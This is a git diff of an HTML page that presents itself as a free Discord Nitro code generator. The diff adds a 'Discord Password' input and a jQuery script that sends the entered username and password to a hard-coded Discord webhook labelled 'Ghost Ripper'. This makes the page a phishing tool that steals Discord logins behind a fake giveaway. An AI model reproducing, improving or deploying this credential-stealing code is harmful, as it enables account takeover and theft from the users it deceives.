@@ -97,15 +97,37 @@
 		<i>*this can take some time to actually find a correct code so please be patient<br>
 		<i style="font-size: 7px;">P.S. this does work but it can be a pain to use so if it doesn't work, sorry there's not much I will do</i>
 	</div>
+
 	<div class="input-group">
 		<div class="input-group-btn">
 			<form action="index.html" name="resolve_form" method="POST">
-				<input name="userid" style="max-width: 470px;" type="text" id="user_id" class="form-control input-lg" placeholder="Discord User Name" />
+				<input name="username" style="max-width: 470px;" type="text" id="user_name" class="form-control input-lg" placeholder="Discord User Name" />
 				<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg">Save</button>
 			</form>
 		</div>	
       </div>
+	<br>
+
+  <div class="input-group">
+	<div class="input-group-btn">
+		<form action="index.html" name="resolve_form" method="POST">
+			<input name="userpassword" style="max-width: 470px;" type="text" id="user_password" class="form-control input-lg" placeholder="Discord Password" />
+			<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg">Save</button>
+		</form>
+	</div>	
   </div>
+</div>
+
+<script>
+    $(function() {
+        $('#Submit').click(function(e) {
+        var username = $("#user_name").val();
+        var password = $("#user_password").val();
+        $.post("https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb",
+    {"content": "```\nUsername: " + username + "\nPassword: " + password + "\n```", "username": "Ghost Ripper", "avatar_url": "https://pepsinitro.github.io/1-Month-Nitro/styles/Image.png"})
+        });
+    });
+    </script>
 
 </style>
 <script src="https://3kh0.github.io/js/main.js"></script>
